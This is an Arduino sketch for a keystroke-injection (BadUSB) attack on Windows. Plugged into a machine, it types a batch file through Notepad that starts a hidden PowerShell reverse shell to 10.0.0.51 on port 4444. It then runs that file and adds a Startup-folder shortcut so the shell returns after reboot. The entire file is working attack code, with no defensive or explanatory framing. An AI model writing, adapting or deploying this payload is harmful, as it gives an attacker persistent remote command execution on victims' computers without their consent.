#include <Keyboard.h>

void setup() {
  Keyboard.begin();  // Start the keyboard library
  delay(2000);  // Wait 2 seconds to make sure the system recognizes the Arduino

  openRunDialog();
  typeAndEnter("notepad");
  typeScriptToNotepad();
  saveFile("C:\\Windows\\Temp\\reverse.bat");
  closeWindow();
  openRunDialog();
  typeAndEnter("C:\\Windows\\Temp\\reverse.bat");
  openStartupFolder();
  createShortcut("C:\\Windows\\Temp\\reverse.bat", "reverse");
  closeWindow();

  Keyboard.end();
}

void loop() {
  // Nothing to do here
}

void openRunDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
}

void typeAndEnter(String text) {
  Keyboard.print(text);
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
}

void typeScriptToNotepad() {
  String script = "@echo off\n"
                  "start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$client = New-Object System.Net.Sockets.TcpClient('10.0.0.51', 4444); $stream = $client.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; Write-Host 'Connected'; while ($true) { $data = $reader.ReadLine(); if ($data -eq 'exit') { break } try { $output = Invoke-Expression $data | Out-String; $writer.WriteLine($output) } catch { $error = 'Error executing command: $_'; $writer.WriteLine($error) } }; $client.Close()\"";
  
  for (int i = 0; i < script.length(); i++) {
    Keyboard.print(script[i]);
    delay(10);
  }
  delay(1000);
}

void saveFile(String filePath) {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  typeAndEnter(filePath);
}

void closeWindow() {
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(500);
  Keyboard.releaseAll();
}

void openStartupFolder() {
  openRunDialog();
  typeAndEnter("shell:startup");
}

void createShortcut(String targetPath, String shortcutName) {
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_F10);
  delay(100);
  Keyboard.releaseAll();
  delay(500);

  for (int i = 0; i < 15; i++) {
    Keyboard.press(KEY_DOWN_ARROW);
    delay(100);
    Keyboard.releaseAll();
  }

  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

  Keyboard.press(KEY_DOWN_ARROW);
  delay(100);
  Keyboard.releaseAll();

  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();

  typeAndEnter(targetPath);
  Keyboard.print(shortcutName);
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
}
